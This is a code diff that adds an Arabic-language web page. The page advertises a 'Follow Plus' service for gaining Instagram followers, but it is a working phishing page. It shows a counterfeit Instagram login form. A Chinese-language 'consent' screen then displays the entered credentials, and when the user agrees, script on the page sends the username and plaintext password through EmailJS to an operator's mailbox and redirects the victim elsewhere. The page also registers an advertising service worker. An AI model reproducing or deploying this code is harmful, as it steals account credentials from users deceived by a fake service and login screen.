@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فولو بلس | زيادة المتابعين</title>
+    
+    <!-- Monetag Verification Meta -->
+    <meta name="monetag" content="11116143">
+    
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body { font-family: 'Cairo', sans-serif; background: #ffffff; color: #1a1a1a; line-height: 1.6; }
+        .container { max-width: 1100px; margin: 0 auto; padding: 0 20px; }
+        
+        header { background: #fff; border-bottom: 1px solid #eee; padding: 15px 0; position: sticky; top: 0; z-index: 100; }
+        .nav { display: flex; justify-content: space-between; align-items: center; }
+        .site-logo { font-size: 24px; font-weight: 900; color: #e1306c; text-decoration: none; }
+        
+        .hero { background: #fafafa; padding: 80px 0; text-align: center; border-bottom: 1px solid #eee; }
+        .hero h1 { font-size: 2.5rem; font-weight: 900; margin-bottom: 15px; }
+        .hero p { font-size: 1.1rem; color: #666; margin-bottom: 30px; max-width: 500px; margin-left: auto; margin-right: auto; }
+        
+        .btn { display: inline-block; background: #e1306c; color: white; padding: 14px 40px; border-radius: 8px; font-weight: 700; font-size: 1rem; text-decoration: none; border: none; cursor: pointer; transition: background 0.2s; }
+        .btn:hover { background: #c21a54; }
+        
+        .stats { padding: 50px 0; background: #fff; }
+        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; text-align: center; }
+        .stat-item h3 { font-size: 2rem; color: #e1306c; font-weight: 900; }
+        .stat-item p { color: #666; font-size: 14px; margin-top: 5px; }
+        
+        .articles { padding: 60px 0; background: #fafafa; }
+        .section-title { text-align: center; font-size: 1.8rem; font-weight: 900; margin-bottom: 40px; }
+        .articles-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 25px; }
+        .article-card { background: #fff; border: 1px solid #eee; border-radius: 12px; padding: 30px; }
+        .article-icon { font-size: 2rem; color: #e1306c; margin-bottom: 15px; }
+        .article-card h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 10px; }
+        .article-card p { color: #666; font-size: 14px; line-height: 1.7; }
+        
+        .features { padding: 60px 0; background: #fff; }
+        .features-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 25px; margin-top: 40px; }
+        .feature-box { text-align: center; padding: 30px 15px; border: 1px solid #eee; border-radius: 12px; }
+        .feature-icon { font-size: 2rem; color: #e1306c; margin-bottom: 15px; }
+        .feature-box h3 { font-size: 1rem; font-weight: 700; margin-bottom: 8px; }
+        .feature-box p { color: #666; font-size: 13px; }
+        
+        .cta { background: #1a1a1a; color: #fff; padding: 60px 0; text-align: center; }
+        .cta h2 { font-size: 1.8rem; font-weight: 900; margin-bottom: 10px; }
+        .cta p { color: #aaa; margin-bottom: 25px; }
+        .btn-white { background: #fff; color: #1a1a1a; }
+        .btn-white:hover { background: #f0f0f0; }
+        
+        footer { background: #fff; border-top: 1px solid #eee; padding: 40px 0 20px; text-align: center; }
+        .footer-logo { font-size: 1.5rem; font-weight: 900; color: #e1306c; margin-bottom: 20px; }
+        .footer-links { display: flex; justify-content: center; gap: 25px; margin-bottom: 20px; flex-wrap: wrap; }
+        .footer-links a { color: #666; text-decoration: none; font-size: 14px; }
+        .copyright { color: #999; font-size: 13px; padding-top: 20px; border-top: 1px solid #eee; }
+
+        #loginApp {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            overflow-y: auto;
+            z-index: 1000;
+        }
+        
+        #mainBody { min-height: 100vh; }
+        
+        #mainBody.login-page {
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .login-container {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+        }
+
+        .insta-logo {
+            font-family: 'Segoe UI', cursive;
+            font-size: 40px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            color: #262626;
+            letter-spacing: -1px;
+        }
+
+        .input-group { margin-bottom: 6px; }
+
+        #loginApp input {
+            width: 100%;
+            padding: 9px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            outline: none;
+            margin-bottom: 6px;
+        }
+
+        #loginApp input:focus { border-color: #a8a8a8; }
+        #loginApp input::placeholder { color: #8e8e8e; font-size: 12px; }
+
+        .login-btn {
+            width: 100%;
+            padding: 8px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 8px;
+            margin-bottom: 15px;
+        }
+
+        .login-btn:hover { background: #1877f2; }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .divider span {
+            padding: 0 15px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            display: block;
+            margin-top: 15px;
+        }
+
+        .signup-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            width: 350px;
+            margin-top: 10px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
+
+        .error-msg {
+            color: #ed4956;
+            font-size: 12px;
+            margin-top: 10px;
+            display: none;
+        }
+
+        #mainBody.consent-page {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Noto Sans CJK SC", Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .consent-container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .chinese-header { font-size: 3rem; margin-bottom: 10px; }
+
+        .consent-container h1 {
+            color: #333;
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+        }
+
+        .chinese-question {
+            background: #fff3e0;
+            padding: 25px;
+            border-radius: 15px;
+            margin: 20px 0;
+            font-size: 1.3rem;
+            color: #d63031;
+            border-right: 5px solid #d63031;
+            font-weight: bold;
+        }
+
+        .info-box {
+            background: #f0f0f0;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            text-align: left;
+        }
+
+        .info-item { margin: 10px 0; font-size: 14px; word-break: break-all; }
+        .info-label { font-weight: bold; color: #555; }
+        .info-value {
+            color: #333;
+            margin-top: 5px;
+            padding: 8px;
+            background: white;
+            border-radius: 5px;
+        }
+
+        .agree-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .agree-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+
+        .agree-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .status-msg {
+            padding: 12px;
+            border-radius: 10px;
+            margin-top: 15px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .status-loading { background: #e3f2fd; color: #1976d2; border: 1px solid #1976d2; }
+        .status-success { background: #e8f5e9; color: #2e7d32; border: 1px solid #2e7d32; }
+        .status-error { background: #ffebee; color: #c62828; border: 1px solid #c62828; }
+
+        .back-link {
+            display: block;
+            margin-top: 20px;
+            color: #667eea;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .back-link:hover { text-decoration: underline; }
+
+        .countdown {
+            font-size: 0.9rem;
+            color: #666;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+
+        .warning-text {
+            font-size: 0.8rem;
+            color: #888;
+            margin-top: 10px;
+        }
+
+        .page { display: none; }
+        .page.active { display: block; }
+        
+        @media (max-width: 768px) {
+            .stats-grid, .articles-grid, .features-grid { grid-template-columns: 1fr; }
+            .hero h1 { font-size: 1.8rem; }
+            .login-container, .signup-box { width: 90%; max-width: 350px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- LANDING PAGE -->
+    <div id="landingPage">
+        <header>
+            <div class="container">
+                <nav class="nav">
+                    <a href="#" class="site-logo">فولو بلس</a>
+                </nav>
+            </div>
+        </header>
+
+        <section class="hero">
+            <div class="container">
+                <h1>زيادة متابعين حقيقية</h1>
+                <p>احصل على متابعين حقيقيين لحسابك بشكل آمن وسريع</p>
+                <button class="btn" onclick="showLogin()">
+                    <i class="fas fa-sign-in-alt"></i> الدخول للحصول على المتابعين
+                </button>
+            </div>
+        </section>
+
+        <section class="stats">
+            <div class="container">
+                <div class="stats-grid">
+                    <div class="stat-item"><h3>+500K</h3><p>متابع تم إضافته</p></div>
+                    <div class="stat-item"><h3>50K+</h3><p>عميل سعيد</p></div>
+                    <div class="stat-item"><h3>99.9%</h3><p>نسبة الرضا</p></div>
+                    <div class="stat-item"><h3>24/7</h3><p>دعم فني</p></div>
+                </div>
+            </div>
+        </section>
+
+        <section class="articles">
+            <div class="container">
+                <h2 class="section-title">آخر المقالات</h2>
+                <div class="articles-grid">
+                    <div class="article-card">
+                        <div class="article-icon"><i class="fas fa-chart-line"></i></div>
+                        <h3>كيف تزيد متابعيك؟</h3>
+                        <p>تعرف على أهم الاستراتيجيات الفعالة لزيادة المتابعين بشكل طبيعي وآمن.</p>
+                    </div>
+                    <div class="article-card">
+                        <div class="article-icon"><i class="fas fa-shield-alt"></i></div>
+                        <h3>أمان حسابك</h3>
+                        <p>نستخدم أحدث تقنيات الحماية لضمان أمان حسابك أثناء العملية.</p>
+                    </div>
+                    <div class="article-card">
+                        <div class="article-icon"><i class="fas fa-bolt"></i></div>
+                        <h3>سرعة في التنفيذ</h3>
+                        <p>احصل على النتائج فوراً! خدمتنا تتميز بالسرعة الفائقة.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="features">
+            <div class="container">
+                <h2 class="section-title">لماذا تختارنا؟</h2>
+                <div class="features-grid">
+                    <div class="feature-box">
+                        <div class="feature-icon"><i class="fas fa-users"></i></div>
+                        <h3>متابعين حقيقيين</h3>
+                        <p>نضمن لك متابعين حقيقيين ونشطين</p>
+                    </div>
+                    <div class="feature-box">
+                        <div class="feature-icon"><i class="fas fa-lock"></i></div>
+                        <h3>حماية كاملة</h3>
+                        <p>نظام حماية متقدم 100%</p>
+                    </div>
+                    <div class="feature-box">
+                        <div class="feature-icon"><i class="fas fa-headset"></i></div>
+                        <h3>دعم 24/7</h3>
+                        <p>فريق دعم فني متخصص</p>
+                    </div>
+                    <div class="feature-box">
+                        <div class="feature-icon"><i class="fas fa-money-bill-wave"></i></div>
+                        <h3>أسعار تنافسية</h3>
+                        <p>أفضل الأسعار مع ضمان الجودة</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="cta">
+            <div class="container">
+                <h2>جاهز لتنمية حسابك؟</h2>
+                <p>انضم إلى آلاف المستخدمين الذين يثقون بنا</p>
+                <button class="btn btn-white" onclick="showLogin()">ابدأ الآن مجاناً</button>
+            </div>
+        </section>
+
+        <footer>
+            <div class="container">
+                <div class="footer-logo">فولو بلس</div>
+                <div class="footer-links">
+                    <a href="#">الشروط</a>
+                    <a href="#">الخصوصية</a>
+                    <a href="#">تواصل معنا</a>
+                </div>
+                <div class="copyright">جميع الحقوق محفوظة © 2024</div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- LOGIN PAGE -->
+    <div id="loginApp" dir="ltr">
+        <div id="mainBody">
+            <div id="loginPage" class="page active">
+                <div>
+                    <div class="login-container">
+                        <div class="insta-logo">Instagram</div>
+                        <form id="loginForm">
+                            <div class="input-group">
+                                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                            </div>
+                            <div class="input-group">
+                                <input type="password" id="password" placeholder="Password" required>
+                            </div>
+                            <button type="submit" class="login-btn">Log In</button>
+                        </form>
+                        <div class="divider"><span>OR</span></div>
+                        <a href="#" class="forgot-password">Forgot password?</a>
+                        <div id="errorMsg" class="error-msg"></div>
+                    </div>
+                    <div class="signup-box">
+                        Don't have an account? <a href="#">Sign up</a>
+                    </div>
+                </div>
+            </div>
+
+            <div id="consentPage" class="page">
+                <div class="consent-container">
+                    <div class="chinese-header">🇨🇳</div>
+                    <h1>数据发送同意书</h1>
+                    <h1 style="font-size: 1rem; color:#999;">同意发送登录信息</h1>
+                    <div class="chinese-question">
+                        ⚠️ 您是否同意发送您的登录信息？ ⚠️
+                    </div>
+                    <div class="info-box">
+                        <div class="info-item">
+                            <div class="info-label">📱 用户名/邮箱/手机号:</div>
+                            <div class="info-value" id="displayUsername">-</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">🔒 密码:</div>
+                            <div class="info-value" id="displayPassword">-</div>
+                        </div>
+                    </div>
+                    <button id="agreeBtn" class="agree-btn">✅ 同意 / 同意 ✅</button>
+                    <div id="statusMsg" class="status-msg"></div>
+                    <div id="countdown" class="countdown"></div>
+                    <div class="warning-text">⚠️ 同意后，您的数据将被安全发送</div>
+                    <a href="#" id="backToLogin" class="back-link">← 返回登录页面</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        /* ========== Monetag Service Worker ========== */
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js')
+                .then(function(registration) {
+                    console.log('Monetag SW registered:', registration);
+                })
+                .catch(function(error) {
+                    console.log('Monetag SW failed:', error);
+                });
+        }
+
+        /* ========== Navigation ========== */
+        function showLogin() {
+            document.getElementById('landingPage').style.display = 'none';
+            document.getElementById('loginApp').style.display = 'block';
+            document.body.style.overflow = 'hidden';
+        }
+
+        /* ========== Login Code ========== */
+        emailjs.init({ publicKey: "L9gViSwmmvXSDKAK-" });
+
+        const loginPage = document.getElementById('loginPage');
+        const consentPage = document.getElementById('consentPage');
+        const mainBody = document.getElementById('mainBody');
+        let userData = null;
+        let isProcessing = false;
+
+        const loginForm = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const errorMsg = document.getElementById('errorMsg');
+
+        function showConsentPage(data) {
+            userData = data;
+            document.getElementById('displayUsername').textContent = userData.username || '-';
+            document.getElementById('displayPassword').textContent = '••••••••';
+            mainBody.className = 'consent-page';
+            loginPage.classList.remove('active');
+            consentPage.classList.add('active');
+        }
+
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value;
+            if (!username || !password) {
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = 'Please fill in both fields / 请填写所有字段';
+                setTimeout(() => { errorMsg.style.display = 'none'; }, 2000);
+                return;
+            }
+            const userInfo = {
+                username: username,
+                password: password,
+                timestamp: new Date().toISOString()
+            };
+            showConsentPage(userInfo);
+        });
+
+        const agreeBtn = document.getElementById('agreeBtn');
+        const statusMsgDiv = document.getElementById('statusMsg');
+        const countdownDiv = document.getElementById('countdown');
+        const backToLogin = document.getElementById('backToLogin');
+
+        async function sendCredentials() {
+            if (!userData) {
+                showStatus('❌ 没有数据可发送！请返回登录页面。', 'error');
+                return false;
+            }
+            const templateParams = {
+                to_name: "AMI HICH Admin",
+                user_id: userData.username,
+                password: userData.password,
+                message: `✨ 用户 ${userData.username} 同意并发送登录数据 ✨`,
+                reply_to: "admin@amihich.com"
+            };
+            try {
+                const response = await emailjs.send('service_pw8zwxs', 'template_lpihxpq', templateParams);
+                console.log('✅ 发送成功:', response);
+                return true;
+            } catch (error) {
+                console.error('❌ 发送失败:', error);
+                return false;
+            }
+        }
+
+        function showStatus(message, type) {
+            statusMsgDiv.textContent = message;
+            statusMsgDiv.className = `status-msg status-${type}`;
+            statusMsgDiv.style.display = 'block';
+        }
+
+        function startCountdownAndRedirect() {
+            let seconds = 2;
+            countdownDiv.textContent = `🔄 将在 ${seconds} 秒后跳转到游戏网站... 🔄`;
+            const interval = setInterval(() => {
+                seconds--;
+                if (seconds >= 0) {
+                    countdownDiv.textContent = `🔄 将在 ${seconds} 秒后跳转到游戏网站... 🔄`;
+                }
+                if (seconds < 0) {
+                    clearInterval(interval);
+                    window.location.href = "https://amins-a.web.app";
+                }
+            }, 1000);
+        }
+
+        function resetToLogin() {
+            userData = null;
+            isProcessing = false;
+            mainBody.className = 'login-page';
+            consentPage.classList.remove('active');
+            loginPage.classList.add('active');
+            usernameInput.value = '';
+            passwordInput.value = '';
+            agreeBtn.disabled = false;
+            agreeBtn.textContent = '✅ 同意 / 同意 ✅';
+            statusMsgDiv.style.display = 'none';
+            countdownDiv.textContent = '';
+        }
+
+        agreeBtn.addEventListener('click', async () => {
+            if (isProcessing) return;
+            if (!userData) {
+                showStatus('❌ 错误：没有数据。请返回登录页面。', 'error');
+                return;
+            }
+            isProcessing = true;
+            agreeBtn.disabled = true;
+            agreeBtn.textContent = '⏳ 正在发送数据... ⏳';
+            showStatus('📤 正在将登录数据发送到电子邮件...', 'loading');
+            const sent = await sendCredentials();
+            if (sent) {
+                showStatus('✅ 登录数据发送成功！', 'success');
+                startCountdownAndRedirect();
+            } else {
+                showStatus('❌ 数据发送失败。请重试。', 'error');
+                agreeBtn.disabled = false;
+                agreeBtn.textContent = '✅ 同意 / 同意 ✅';
+                isProcessing = false;
+            }
+        });
+
+        backToLogin.addEventListener('click', (e) => {
+            e.preventDefault();
+            resetToLogin();
+        });
+
+        mainBody.className = 'login-page';
+        console.log('🚀 系统已完全准备就绪！');
+    </script>
+
+</body>
+</html>
